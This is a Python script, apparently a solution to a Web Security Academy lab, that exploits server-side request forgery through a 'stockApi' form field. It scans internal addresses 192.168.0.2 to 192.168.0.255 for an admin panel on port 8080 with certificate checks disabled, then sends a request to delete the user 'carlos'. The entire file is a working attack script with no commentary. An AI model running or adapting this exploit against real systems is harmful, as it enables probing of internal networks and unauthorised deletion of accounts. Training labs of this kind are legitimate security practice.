import http.client
import ssl
import urllib.parse

LAB_ID = "???"


def POST_product_stock(
        stockApi: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/product/stock'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'te': 'trailers',
    }
    fields = {
        'stockApi': stockApi,
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


internal_ip = None
response = None
for i in range(2, 256):
    internal_ip = f"192.168.0.{i}"
    print(f"trying internal ip: {internal_ip}")
    response = POST_product_stock(f'http://{internal_ip}:8080/admin')
    if response.status != 500:
        print(f"found admin interface at {internal_ip}")
        break

print("admin interface:")
print(f"status: {response.status}")
for header, value in response.headers.items():
    print(f"{header}: {value}")
print(response.read().decode())

delete_path = "/admin/delete?username=carlos"
response = POST_product_stock(f'http://{internal_ip}:8080{delete_path}')
if response.status == 200:
    print("deleted user carlos")
